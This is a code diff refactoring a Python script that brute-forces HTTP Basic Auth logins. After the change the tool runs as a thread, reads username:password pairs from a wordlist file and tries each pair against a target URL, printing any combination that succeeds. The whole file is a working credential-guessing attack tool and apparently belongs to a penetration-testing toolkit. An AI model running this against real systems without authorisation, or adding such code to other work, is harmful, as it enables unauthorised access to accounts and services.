@@ -1,37 +1,43 @@
 # Python Script for HTTP Brute Force
 
 # Importing Modules
-from colorama import init, Fore
+import threading
+import os
+import requests
 from requests.auth import HTTPBasicAuth
-import requests, os
+from colorama import init, Fore
 
 init()
 GREEN = Fore.GREEN
 RESET = Fore.RESET
 
 
-class HTTP_brute:
-    def httpbrute(self, hostname, username, password):
+class HTTPBrute(threading.Thread):
+    def __init__(self, target):
+        threading.Thread.__init__(self)
+        self.target = target
+
+    def http_brute(self, hostname, username, password):
         check = requests.get(hostname, auth=HTTPBasicAuth(username, password))
         r = check.status_code
         if r == 200:
             print(
-                f"{GREEN}[+] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
+                f"{GREEN}[HTTP] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
             return True
 
         elif r == 401:
-            print(f"[!] Invalid credentials for {username}:{password}")
+            print(f"[HTTP] Invalid credentials for {username}:{password}")
 
-    def run(self, hostname):
+    def run(self):
         # Read the file
         parent_dir = os.getcwd()
         wordlist_path = os.path.join(parent_dir, "data", "wordlists", "http_wordlist.txt")
-        credlist = open(wordlist_path).read().splitlines()
+        cred_list = open(wordlist_path).read().splitlines()
 
         # Start the brute force
-        for cred in credlist:
+        for cred in cred_list:
             username = cred.split(':')[0]
             password = cred.split(':')[1]
 
-            if self.httpbrute(hostname, username, password):
+            if self.http_brute(self.target, username, password):
                 break
